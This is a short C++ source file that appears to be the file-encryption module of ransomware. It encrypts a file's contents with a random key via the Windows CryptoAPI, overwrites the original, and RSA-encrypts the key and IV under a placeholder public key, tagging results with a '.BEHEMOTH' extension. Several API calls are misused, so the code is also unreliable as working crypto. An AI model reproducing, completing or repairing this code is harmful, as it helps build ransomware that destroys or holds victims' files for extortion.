#include "file_enc.h"
#include <windows.h>
#include <wincrypt.h>
#include <vector>
#include <fstream>
#include "gen_str.h"
#include "rsa_enc.h"


std::map<std::string, std::map<std::string, std::string>> FileEnc(const std::string& filePath) {
    std::string key = gen_str(32);
    std::string iv = gen_str(16);
    unsigned char keyBytes[32];
    unsigned char ivBytes[16];
    std::copy(key.begin(), key.end(), keyBytes);
    std::copy(iv.begin(), iv.end(), ivBytes);

    // Read the input file
    std::ifstream inputFile(filePath, std::ios::binary);
    std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(inputFile), {});
    inputFile.close();

    // Encrypt the data using the Windows API
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    DWORD dataSize = buffer.size();
    BYTE* encryptedData = new BYTE[dataSize];
    memcpy(encryptedData, buffer.data(), dataSize);

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }

    if (!CryptImportKey(hProv, keyBytes, sizeof(keyBytes), 0, 0, &hKey)) {
        return {};
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return {};
    }

    if (!CryptEncrypt(hKey, hHash, TRUE, 0, encryptedData, &dataSize, dataSize)) {
        return {};
    }

    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    // Write the encrypted data to the file
    std::ofstream outputFile(filePath, std::ios::binary);
    outputFile.write((char*)encryptedData, dataSize);
    outputFile.close();

    // Encrypt the key and IV using your public key
    std::string pubKey = "your_public_key";
    std::string encryptedKey = RsaDataEncrypt(key, pubKey);
    std::string encryptedIv = RsaDataEncrypt(iv, pubKey);

    // Return the encrypted key and IV in a map
    std::map<std::string, std::string> encKeys = { {"key", encryptedKey}, {"iv", encryptedIv} };
    std::map<std::string, std::map<std::string, std::string>> fileKeys = { {filePath + ".BEHEMOTH", encKeys} };
    return fileKeys;
}
